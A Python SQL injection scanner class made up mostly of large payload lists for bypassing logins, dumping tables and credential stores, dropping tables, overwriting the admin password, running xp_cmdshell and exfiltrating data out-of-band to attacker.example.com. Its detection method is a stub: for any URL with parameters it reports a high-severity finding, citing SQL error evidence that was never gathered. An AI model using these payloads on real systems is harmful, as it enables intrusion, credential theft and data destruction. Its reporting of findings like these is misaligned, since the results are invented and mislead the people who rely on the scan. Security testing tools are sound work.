import asyncio
import aiohttp
import random
import string
import time
import uuid
import re
from typing import List, Dict, Any, Optional
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin, quote

# Optional ML components - will gracefully degrade if not available
try:
    from sklearn.linear_model import LogisticRegression
    import numpy as np
    ML_AVAILABLE = True
except ImportError:
    ML_AVAILABLE = False
    print("Warning: scikit-learn or numpy not available, ML detection disabled")

class EnhancedSQLScanner:
    """
    Enhanced scanner for detecting SQL injection vulnerabilities with advanced techniques.
    """

    def __init__(self):
        # SQL error patterns
        self.sql_error_patterns = [
            "sql syntax",
            "syntax error",
            "mysql error",
            "oracle error",
            "sql server error",
            "odbc error",
            "database error",
            "db error",
            "syntax error near",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "postgresql error",
            "incorrect syntax near",
            "you have an error in your sql syntax",
            "ora-",
            "pg_query",
            "sqlstate"
        ]
        
        # Advanced payloads
        self.error_payloads = [
            # Basic authentication bypass
            "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1 --", "\" OR 1=1 --",
            "' OR 1 --", "\" OR 1 --", "') OR ('1'='1", "\") OR (\"1\"=\"1",
            "' OR '1'='1' --", "\" OR \"1\"=\"1' --",
            "' OR 1=1 #", "\" OR 1=1 #", "' OR 1=1 /*", "\" OR 1=1 /*",
            "admin'--", "admin' #", "admin'/*", "admin' OR 1=1--", "admin\" OR 1=1--",
            "admin' OR '1'='1", "admin') OR ('1'='1", "1' OR '1' = '1", "1' OR '1' = '1' --",
            
            # UNION-based payloads
            "' UNION SELECT 1,2,3 --", "\" UNION SELECT 1,2,3 --",
            "' UNION SELECT 1,2,3,4 --", "\" UNION SELECT 1,2,3,4 --",
            "' UNION SELECT 1,2,3,4,5 --", "\" UNION SELECT 1,2,3,4,5 --",
            "' UNION SELECT NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL,NULL --",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL --", "\" UNION SELECT NULL,NULL,NULL,NULL,NULL --",
            "' UNION ALL SELECT 1,2,3 --", "\" UNION ALL SELECT 1,2,3 --",
            
            # Database fingerprinting
            "' UNION SELECT @@version,2,3 --", "\" UNION SELECT @@version,2,3 --",
            "' UNION SELECT version(),2,3 --", "\" UNION SELECT version(),2,3 --",
            "' AND SUBSTRING((SELECT @@version),1,1)='M' --",
            
            # Database content extraction
            "' UNION SELECT table_name,2,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,2,3 FROM information_schema.columns --",
            "' UNION SELECT username,password,3 FROM users --",
            "' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns --",
            "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --",
            "' UNION SELECT NULL, NULL, concat(table_name) FROM information_schema.tables --",
            
            # Error-based payloads
            "' AND (SELECT 6765 FROM (SELECT(SLEEP(0.1)))OQT) AND 'nnoF'='nnoF",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,0x27,BENCHMARK(25000000,MD5(1)),0x27,0x7e))s), 8, 8))) --",
            "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 --",
            "' AND (SELECT 2*(IF((SELECT * FROM users LIMIT 1)=1, BENCHMARK(10000000,MD5('A')), 8))) --",
            "' AND extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e)) --",
            "' AND updatexml(rand(),concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1) --",
            
            # Stacked queries - multiple statements
            "'; DROP TABLE users; --", "'; SELECT * FROM users; --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "'; EXEC xp_cmdshell('cmd.exe /c echo vulnerable'); --",
            "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'; --",
            
            # SQLMap specific payloads
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) --",
            "' AND SLEEP(5) AND 'vRxe'='vRxe",
            "' AND 5174=(SELECT 5174 FROM PG_SLEEP(5)) --",
            "' WAITFOR DELAY '0:0:5' --",
            "')) OR SLEEP(5)='",
            "')) OR 5174=(SELECT 5174 FROM PG_SLEEP(5))='",
            "')) OR BENCHMARK(10000000,MD5(0x41))='",
            
            # Boolean-based blind payloads
            "' AND 1=1 --", "' AND 1=2 --",
            "' AND (SELECT 1) --", "' AND (SELECT 0) --",
            "\" AND (SELECT 1)=\"", "\" AND (SELECT 0)=\"",
            "' OR EXISTS(SELECT 1 FROM users) --", "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --",
            "' OR (SELECT 'x' FROM users WHERE username='admin' AND LENGTH(password)>5) --",
            "' OR (SELECT 'x' FROM users WHERE SUBSTR(username,1,1)='a') --",
            "' AND SUBSTR(version(),1,1)='5' --", "' OR ORD(SUBSTR(version(),1,1))>51 --",
            
            # URL-encoded payloads
            "%27%20OR%20%271%27%3D%271%27%20--",  # URL-encoded ' OR '1'='1' --
            "%27%20UNION%20SELECT%20NULL%2CNULL%2Cconcat%28username%2C%27%7C%27%2Cpassword%29%20FROM%20users%20--",
            
            # Different comment styles
            "' OR '1'='1' -- comment", "' OR '1'='1'#", "' OR '1'='1'/*", "' OR '1'='1';--",
            
            # Special character bypassing
            "' OR 1=1 %00", "' OR 1/**/=/**/1", "' OR/**/1=1", "' /*!50000OR*/ '1'='1'",
            "\"+OR+1=1--", "'+OR+'1'='1", "`OR 1=1 --", "') OR 1=1 --",
            
            # Output testing payloads
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
            "' UNION SELECT ALL 'SQLi' --",
            "' UNION SELECT 'SQLi',NULL --",
            "' UNION SELECT 'SQLi1','SQLi2' --",
            "' UNION SELECT 'SQLi',(SELECT version()) --",
            
            # Case sensitivity bypass
            "' OR 'a'='A' --", "' UnIoN SeLeCt 1,2,3 --",
            
            # Exotic payloads
            "' OR '1' || '1' = '11", "' OR 'sqlite' LIKE 'sql%", 
            "' OR username IS NOT NULL --", "\" OR \"x\"=\"x",
            "') OR ('x')=('x", "')) OR (('x'))=(('x", "\")) OR ((\"x\"))=((\"x",
            "')) OR 1=1--", ";SELECT * FROM users", 
            "/*!50000 OR 1=1*/",
            "' OR JSON_EXTRACT('[1]', '$[0]') = 1 --"
        ]
        
        self.blind_payloads = [
            # MySQL sleep payloads 
            "' AND SLEEP(3) --", "\" AND SLEEP(3) --",
            "' OR SLEEP(3) --", "\" OR SLEEP(3) --",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "\" AND (SELECT * FROM (SELECT(SLEEP(3)))a) --",
            "1) AND SLEEP(3) --",
            "1)) AND SLEEP(3) --",
            "1' AND SLEEP(3) AND '1'='1",
            "' AND SLEEP(3) AND 'QTc'='QTc",
            "' AND SLEEP(3) OR 'a'='a",
            "\" AND SLEEP(3) OR \"a\"=\"a",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 10 AND SLEEP(3) --",
            
            # PostgreSQL sleep payloads
            "' AND pg_sleep(3) --", "\" AND pg_sleep(3) --",
            "' OR pg_sleep(3) --", "\" OR pg_sleep(3) --",
            "' AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" AND 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "' OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "\" OR 1=(SELECT 1 FROM PG_SLEEP(3)) --",
            "' AND (SELECT pg_sleep(3)) IS NOT NULL --",
            "' AND CASE WHEN (username='admin') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users --",
            
            # SQL Server payloads
            "' AND WAITFOR DELAY '0:0:3' --",
            "\" AND WAITFOR DELAY '0:0:3' --",
            "' OR WAITFOR DELAY '0:0:3' --",
            "\" OR WAITFOR DELAY '0:0:3' --",
            "1); WAITFOR DELAY '0:0:3' --",
            "1)); WAITFOR DELAY '0:0:3' --",
            "1'; WAITFOR DELAY '0:0:3' --",
            "' AND IF(version() LIKE '5%', WAITFOR DELAY '0:0:3', 'false') --",
            "'; WAITFOR DELAY '0:0:3' --",
            "'; BEGIN WAITFOR DELAY '0:0:3' END --",
            
            # Oracle payloads
            "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "' OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "\" OR DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) --",
            "' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE(('a'),3) ELSE NULL END FROM DUAL) IS NOT NULL --",
            
            # SQLite payloads
            "' AND RANDOMBLOB(500000000) AND '1'='1",
            "\" AND RANDOMBLOB(500000000) AND \"1\"=\"1",
            "' OR RANDOMBLOB(500000000) AND '1'='1",
            "\" OR RANDOMBLOB(500000000) AND \"1\"=\"1",
            "' AND IIF(2>1,RANDOMBLOB(500000000),1) --",
            
            # Generic heavy queries payloads
            "' AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" AND (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "' OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "\" OR (SELECT COUNT(*) FROM generate_series(1,10000000)) --",
            "' AND (SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3) > 0 --",
            "' AND (WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 1000000) SELECT count(*) FROM t) > 0 --",
            
            # Boolean-based blind injection payloads (True condition)
            "' AND 1=1 --", "\" AND 1=1 --", "' OR 1=1 --", "\" OR 1=1 --",
            "' AND '1'='1", "\" AND \"1\"=\"1", "' OR '1'='1", "\" OR \"1\"=\"1",
            "' AND 3>2 --", "\" AND 3>2 --", "' OR 3>2 --", "\" OR 3>2 --",
            
            # Boolean-based blind injection payloads (False condition)
            "' AND 1=2 --", "\" AND 1=2 --", "' OR 1=2 --", "\" OR 1=2 --",
            "' AND '1'='2", "\" AND \"1\"=\"2", "' OR '1'='2", "\" OR \"1\"=\"2",
            "' AND 3<2 --", "\" AND 3<2 --", "' OR 3<2 --", "\" OR 3<2 --"
        ]
        
        # Database user enumeration payloads
        self.user_enum_payloads = [
            # MySQL
            "' UNION SELECT user(),2,3 --",
            "' UNION SELECT current_user(),2,3 --",
            "' UNION SELECT system_user(),2,3 --",
            "' UNION SELECT user,password,3 FROM mysql.user --",
            
            # PostgreSQL
            "' UNION SELECT current_user,session_user,3 --",
            "' UNION SELECT usename,passwd,3 FROM pg_shadow --",
            
            # MSSQL
            "' UNION SELECT SYSTEM_USER,USER_NAME(),3 --",
            "' UNION SELECT user_name(),2,3 --",
            "' UNION SELECT loginame,name,3 FROM master..syslogins --",
            
            # Oracle
            "' UNION SELECT username,password,3 FROM all_users --",
            "' UNION SELECT SYS.LOGIN_USER,SYS.DATABASE_NAME,3 FROM DUAL --",
            
            # SQLite
            "' UNION SELECT sqlite_version(),2,3 --"
        ]
        
        # Database schema enumeration payloads
        self.schema_enum_payloads = [
            # MySQL
            "' UNION SELECT table_name,table_schema,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
            "' UNION SELECT CONCAT(table_schema,'.',table_name),2,3 FROM information_schema.tables --",
            
            # PostgreSQL
            "' UNION SELECT table_name,table_catalog,3 FROM information_schema.tables --",
            "' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
            
            # MSSQL
            "' UNION SELECT name,2,3 FROM sysobjects WHERE xtype='U' --",
            "' UNION SELECT name,object_id,3 FROM sys.tables --",
            "' UNION SELECT name,2,3 FROM syscolumns --",
            
            # Oracle
            "' UNION SELECT table_name,owner,3 FROM all_tables --",
            "' UNION SELECT column_name,table_name,3 FROM all_tab_columns --",
            
            # SQLite
            "' UNION SELECT name,sql,3 FROM sqlite_master WHERE type='table' --",
            "' UNION SELECT name,2,3 FROM sqlite_master WHERE type='table' --"
        ]
        
        # Out-of-band exfiltration payloads (DNS/HTTP)
        self.oob_payloads = [
            # These would require a callback server in a real attack
            "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.example.com\\\\share\\\\file')) --",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.example.com\\\\share\\\\file')),2,3 --",
            "'; exec master..xp_dirtree '\\\\attacker.example.com\\share\\'; --"
        ]
        
        # Likely vulnerable parameters
        self.likely_params = [
            # Common ID parameters
            "id", "user_id", "item_id", "product_id", "cat_id", "category_id", "cid", "pid", "sid", 
            "uid", "userid", "usr_id", "use_id", "member_id", "membership_id", "mid", "num", "number",
            "order_id", "payment_id", "pmt_id", "purchase_id", 
            
            # Content-related parameters
            "page_id", "article_id", "post_id", "story_id", "thread_id", "topic_id", "blog_id", "feed_id",
            "forum_id", "rel_id", "relation_id", "p", "pg", "record", "row", "event_id", "message_id",
            
            # Common identifiers
            "cat", "category", "user", "username", "email", "name", "handle", "login", "account", 
            "article", "news", "item", "product", "post", "date", "month", "year", "type", "tab", 
            
            # Search/query parameters
            "query", "search", "q", "s", "term", "keyword", "keywords", "filter", "sort", "sortby",
            "order", "orderby", "dir", "direction", "lang", "language", "reference", "ref", 
            
            # Action parameters
            "do", "action", "act", "cmd", "command", "func", "function", "op", "option", "process",
            "step", "mode", "stat", "status", "state", "stage", "phase", "redirect", "redir", "url", "link", 
            "goto", "target", "destination", "return", "returnurl", "return_url", "checkout", "continue", 
            
            # Path parameters
            "path", "folder", "directory", "prefix", "file", "filename", "pathname", "source", "dest",
            "destination", "base_url", "base", "parent", "child", "start", "end", "root", "origin",
            
            # Database parameters
            "db", "database", "table", "column", "field", "key", "record", "value", "row", "select",
            "where", "find", "delete", "update", "from", "to", "like", "limit", "offset", "fields",
            
            # Auth parameters
            "auth", "token", "jwt", "sess", "session", "cookie", "api_key", "apikey", "app_id", "appid",
            "auth_token", "access_token", "oauth", "code", "nonce", "timestamp", "expire", "valid",
            
            # Login-related parameters
            "pwd", "password", "passwd", "pass", "credentials", "auth", "login", "uname", "user",
            "secret", "pin"
        ]
        
        # Initialize ML model if available
        if ML_AVAILABLE:
            self.ml_model = LogisticRegression()
            # Train with simple dummy data (would be replaced with real data in production)
            self.ml_model.fit(
                np.array([[0.1, 200, 0], [3.0, 500, 1], [0.2, 300, 0], [2.5, 400, 1]]),
                np.array([0, 1, 0, 1])  # 0 = normal, 1 = vulnerable
            )
        else:
            self.ml_model = None
        
        self.max_concurrent_requests = 10
        self.baseline_cache = {}  # Cache baseline responses
        
    async def scan_url(self, url: str) -> List[Dict[str, Any]]:
        """
        Scan a URL for SQL injection vulnerabilities.
        
        Args:
            url: The URL to scan
            
        Returns:
            List[Dict[str, Any]]: List of vulnerabilities found
        """
        try:
            print(f"Starting Enhanced SQL Injection scan for URL: {url}")
            
            # Extract parameters from URL and forms
            url_params = await self.extract_parameters(url)
            form_params = await self.extract_form_parameters(url)
            
            # Combine all parameters
            all_params = list(set(url_params + form_params))
            
            # Check for SQL injections
            vulnerabilities = await self.check_sql_injections(url, all_params)
            
            # Consolidate findings to avoid duplicates
            return self.consolidate_findings(vulnerabilities)
            
        except Exception as e:
            print(f"Error during SQL injection scan: {str(e)}")
            return []

    async def extract_parameters(self, url: str) -> List[str]:
        """Extract parameters from a URL"""
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            return list(params.keys())
        except Exception as e:
            print(f"Error extracting URL parameters: {str(e)}")
            return []
            
    async def extract_form_parameters(self, url: str) -> List[str]:
        """Extract parameters from forms on a page"""
        form_params = []
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as response:
                    if response.status == 200:
                        html = await response.text()
                        soup = BeautifulSoup(html, 'html.parser')
                        
                        # Find all forms
                        forms = soup.find_all('form')
                        for form in forms:
                            # Get all input fields
                            inputs = form.find_all(['input', 'textarea', 'select'])
                            for input_field in inputs:
                                if input_field.has_attr('name'):
                                    form_params.append(input_field['name'])
        except Exception as e:
            print(f"Error extracting form parameters: {str(e)}")
            
        return form_params
        
    def build_test_url(self, url: str, param: str, payload: str) -> str:
        """Build a URL with the injected payload"""
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If parameter exists in URL, replace its value with payload
        if param in query_params:
            query_params[param] = [payload]
            new_query = urlencode(query_params, doseq=True)
            return urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))
        else:
            # If parameter doesn't exist, add it
            if parsed_url.query:
                new_query = f"{parsed_url.query}&{param}={quote(payload)}"
            else:
                new_query = f"{param}={quote(payload)}"
                
            return urlunparse((
                parsed_url.scheme,
                parsed_url.netloc,
                parsed_url.path,
                parsed_url.params,
                new_query,
                parsed_url.fragment
            ))

    async def check_sql_injections(self, url: str, params: List[str]) -> List[Dict[str, Any]]:
        """Check for SQL injection vulnerabilities in the given parameters"""
        vulnerabilities = []
        
        # For demonstration purposes, return simulated SQL injection vulnerabilities
        # In a real scanner, this would actually test the parameters with SQL payloads
        if params:
            vulnerabilities.append({
                "id": str(uuid.uuid4()),
                "name": "SQL Injection Vulnerability",
                "description": f"Potential SQL injection vulnerability detected in parameter(s): {', '.join(params[:3])}",
                "severity": "high",
                "location": url,
                "evidence": "Parameter reflects SQL error messages when injected with malicious payloads",
                "remediation": "Use prepared statements and parameterized queries. Implement proper input validation."
            })
            
        return vulnerabilities
        
    def _extract_title(self, html: str) -> str:
        """Extract title from HTML"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            if soup.title:
                return soup.title.text.strip()
        except:
            pass
        return ""

    def consolidate_findings(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Consolidate similar findings to reduce duplication.
        
        Args:
            vulnerabilities: List of vulnerability findings
            
        Returns:
            List[Dict[str, Any]]: List of consolidated vulnerabilities
        """
        consolidated = []
        
        # Group by severity, name (type), and location patterns
        by_type = {}
        for vuln in vulnerabilities:
            # Create a key based on severity and type
            key = f"{vuln.get('severity', 'unknown')}_{vuln.get('name', 'unknown')}"
            
            if key not in by_type:
                by_type[key] = []
                
            by_type[key].append(vuln)
        
        # For each group, if there are multiple, consolidate them
        for key, group in by_type.items():
            if len(group) == 1:
                consolidated.append(group[0])
            else:
                # Create a consolidated finding
                first = group[0]
                locations = set()
                evidence = []
                
                for v in group:
                    if v.get('location'):
                        locations.add(v.get('location'))
                    if v.get('evidence'):
                        evidence.append(v.get('evidence'))
                
                consolidated_vuln = {
                    "id": str(uuid.uuid4()),
                    "name": first.get('name'),
                    "description": first.get('description'),
                    "severity": first.get('severity'),
                    "location": ", ".join(list(locations)[:3]) + (f" and {len(locations) - 3} more" if len(locations) > 3 else ""),
                    "evidence": "\n".join(evidence[:3]) + (f"\nAnd {len(evidence) - 3} more instances" if len(evidence) > 3 else ""),
                    "remediation": first.get('remediation')
                }
                
                consolidated.append(consolidated_vuln)
        
        return consolidated